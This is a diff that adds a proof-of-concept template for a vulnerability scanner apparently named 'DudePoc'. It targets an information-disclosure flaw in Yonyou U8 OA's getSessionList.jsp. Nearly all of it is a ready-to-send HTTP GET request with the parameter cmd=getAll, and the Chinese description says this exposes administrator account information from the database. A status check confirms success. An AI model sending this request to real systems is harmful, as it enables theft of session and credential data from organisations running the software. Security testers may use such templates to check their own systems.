@@ -1,0 +1,14 @@
+﻿<DudePoc_Name>用友 OA U8 getSessionList.jsp 信息泄露</DudePoc_Name>
+<DudePoc_Description>用友 U8 OA getSessionList.jsp文件，通过漏洞攻击者可以获取数据库中管理员的账户信息</DudePoc_Description>
+<DudePoc_SetHeader>
+GET /yyoa/ext/https/getSessionList.jsp?cmd=getAll HTTP/1.1
+Host: $<AttackHost>$
+User-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36 Edg/113.0.1774.57
+</DudePoc_SetHeader>
+<DudePoc_SetData>
+
+</DudePoc_SetData>
+<DudePoc_VerifyStatusCode>200</DudePoc_VerifyStatusCode>
+<DudePoc_VerifyData>1</DudePoc_VerifyData>
+<DudePoc_VerifyFile></DudePoc_VerifyFile>
+<DudePoc_AttackCode></DudePoc_AttackCode>
